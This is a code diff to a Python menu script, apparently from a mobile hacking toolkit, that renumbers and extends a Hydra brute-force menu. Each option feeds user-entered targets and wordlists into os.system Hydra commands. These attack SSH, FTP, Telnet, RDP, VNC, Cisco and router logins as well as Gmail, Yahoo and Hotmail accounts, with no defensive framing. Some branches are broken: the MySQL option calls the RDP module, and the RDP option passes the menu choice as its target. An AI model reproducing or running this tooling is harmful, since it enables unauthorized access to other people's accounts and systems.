@@ -473,6 +473,7 @@ def nmap():
 		nmap()
 
 			  
+
 def hydra():
      print("1.Dowload Hydra")
      print("2.Cisco bruteforce")
@@ -486,84 +487,85 @@ def hydra():
      print("10.RDP bruteforce")
      print("11.MySql bruteforce")
      print("12.Teamspeak bruteforce")
+     print("13.VNC bruteforce")
      print()
      i = input("[pearl(Hydra)> ")
-     if i == 'hydra':
+     if i == '1':
      	os.system("clear")
      	print("Installing Hydra")
      	os.system("pkg install hydra")
-     elif i == 'cisco':
+     elif i == '2':
      	w = input("Enter IP : ")
      	j = input("Wordlist : ")
      	os.system("hydra -P %s %s cisco" % (j, w))
      	hydra()
-     elif i == 'ftp':
+     elif i == '3':
      	os.system("clear")
      	u = input("User : ")
      	w = input("Enter IP : ")
      	j = input("Wordlist : ")
      	os.system("hydra -l %s -P %s %s ftp" % (u, j, w))
      	hydra()
-     elif i == 'vnc':
+     elif i == '13':
      	os.system("clear")
      	w = input("Enter IP : ")
      	j = input("Wordlist : ")
      	os.system("hydra -P %s -e n -t 1 %s vnc -V" % (j, w))
      	hydra()
-     elif i == 'gmail':
+     elif i == '4':
      	os.system("clear")
      	e = input("Email : ")
      	j = input("Wordlist : ")
      	os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (e, j))
      	hydra()
-     elif i == 'ssh':
+     elif i == '5':
      	os.system("clear")
      	u = input("User : ")
      	w = input("Enter IP : ")
      	j = input("Wordlist : ")
      	os.system("hydra -l %s -P %s %s ssh" % (u,j, w))
      	hydra()
-     elif i == 'telnet':
+     elif i == '6':
      	os.system("clear")
      	u = input("User : ")
      	w = input("Enter IP : ")
      	j = input("Wordlist : ")
      	os.system("hydra -l %s -P %s %s telnet" % (u, j, w))
      	hydra()
-     elif i == 'yahoo':
+     elif i == '7':
      	os.system("clear")
      	e = input("Email : ")
      	j = input("Wordlist : ")
      	os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (e, j))
      	hydra()
-     elif i == 'hotmail':
+     elif i == '8':
      	os.system("clear")
      	e = input("Email : ")
      	j = input("Wordlist : ")
      	os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (e, j))
      	hydra()
-     elif i == 'router':
+     elif i == '9':
      	os.system("clear")
      	u = input("User : ")
      	e = input("Email : ")
      	j = input("Wordlist : ")
      	os.system("hydra -m / -l %s -P %s %s http-get" % (u, j, e))
      	hydra()
-     elif i == 'rdp':
+     elif i == '10':
      	os.system("clear")
      	u = input("User :")
      	e = input("Email :")
      	j = input("Wordlist :")
      	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
      	hydra()
-     elif i == 'mysql':
+     elif i == '11':
      	os.system("clear")
      	u = input("User :")
      	i = input("Enter IP : ")
      	j = input("'Wordlist :")
      	os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (u, j, i))
      	hydra()
-     elif i == 'teamspeak':
+     elif i == '12':
         u = input("User :")
         i = input("IP :")
         j = input("Wordlist :")
@@ -571,7 +573,7 @@ def hydra():
         hydra()
      elif i == 'help':
         os.system("clear")
-        print("\n TYPE THIS COMMANDS  : \n hydra - To install hydra \n cisco - Cisco bruteforce \n ftp - FTP bruteforce \n vnc - vnc bruteforce \n gmail - Gmail bruteforce \n yahoo - Yahoo bruteforce \n telnet - Telnet bruteforce \n teamspeak - Teamspek bruteforce \n mysql - MySql bruteforce \n rdp - RDP briteforce \n router - Router bruteforce \n hotmail - Hotmail bruteforce \n help - For help \n clear - Clearing terminal \n  back - To go back to pearl console")
+        print("\n Use numbers corresponding to options to use them. \n back - To go back to pearl console")
         hydra()
      elif i == 'clear':
      	os.system("clear")
@@ -582,7 +584,8 @@ def hydra():
      	print("[!] Invalid input")
      	print("[!] Try again")
      	print()
-     	hydra()
+     	hydra()     	
+     	
 
 def sql():
 	 os.system("cd ~/sqlmap")
